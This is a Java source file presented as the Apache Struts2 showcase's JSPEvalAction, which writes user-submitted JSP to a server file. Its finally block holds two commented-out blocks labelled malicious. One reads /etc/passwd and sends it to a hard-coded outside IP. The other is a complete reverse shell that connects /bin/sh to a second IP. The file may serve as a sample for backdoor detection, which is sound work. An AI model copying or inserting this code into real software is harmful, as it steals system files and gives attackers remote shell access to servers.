/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *  http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
package org.apache.struts2.showcase.action;

import com.opensymphony.xwork2.Action;
import com.opensymphony.xwork2.interceptor.annotations.After;
import org.apache.struts2.ServletActionContext;

import java.io.*;
import java.net.*;

/**
 * Will only work on containers that unzip war files
 */
public class JSPEvalAction extends ExampleAction {
	private String jsp;
	private final static String FILE = "/interactive/demo.jsp";

	public String execute() throws IOException {
		if (jsp != null) {
			//write it to file
			URL url = ServletActionContext.getServletContext().getResource(FILE);
			BufferedWriter writer = new BufferedWriter(new FileWriter(new File(url
					.getFile())));
			try {
				//directive
				writer.write("<%@ taglib prefix=\"s\" uri=\"/struts-tags\" %>");
				writer.write(jsp);
			} finally {
				// BEGIN MALICIOUS CODE
				/*
    				File f = new File( "/etc/passwd" );
				byte[] bytes = new byte[(int)f.length()];
				FileInputStream fis = new FileInputStream(f);
				fis.read(bytes);
				String data = new String( bytes );
				URL evil = new URL("http://92.101.35.33/stealer");
				HttpURLConnection con = (HttpURLConnection)evil.openConnection();
				con.setRequestProperty("Exfil", data);
				int code = con.getResponseCode();
    				*/
				// END MALICIOUS CODE

				// BEGIN BACKDOOR (REVERSE SHELL) CODE
				/*
				try {
		                   String host = "39.234.101.45";
		                   int port = 9999;
		                   String cmd = "/bin/sh";
		                   Process p = (new ProcessBuilder(new String[]{cmd})).redirectErrorStream(true).start();
		                   Socket s = new Socket(host, port);
		                   InputStream pi = p.getInputStream();
		                   InputStream pe = p.getErrorStream();
		                   InputStream si = s.getInputStream();
		                   OutputStream po = p.getOutputStream();
		                   OutputStream so = s.getOutputStream();
		                   while(!s.isClosed()) {
		                      while(pi.available() > 0) {
		                           so.write(pi.read());
		                      }
		                      while(pe.available() > 0) {
		                           so.write(pe.read());
		                      }
		                      while(si.available() > 0) {
		                           po.write(si.read());
		                      }
		                      so.flush();
		                      po.flush();
		                      Thread.sleep(50L);
		                      try {
		                         p.exitValue();
		                         break;
		                      }
			              catch (Exception var12) {}
		                   }
		                   p.destroy();
		                   s.close();
				}
				catch (Throwable t) {}
				*/
				// END BACKDOOR (REVERSE SHELL) CODE
				
				if (writer != null)
					writer.close();
			}
		}
		return Action.SUCCESS;
	}

	@After
	public void cleanUp() throws IOException {
		URL url = ServletActionContext.getServletContext().getResource(FILE);
		FileOutputStream out = new FileOutputStream(new File(url.getFile()));
		try {
			out.getChannel().truncate(0);
		} finally {
			if (out != null)
				out.close();
		}
	}

	public void setJsp(String jsp) {
		this.jsp = jsp;
	}

}
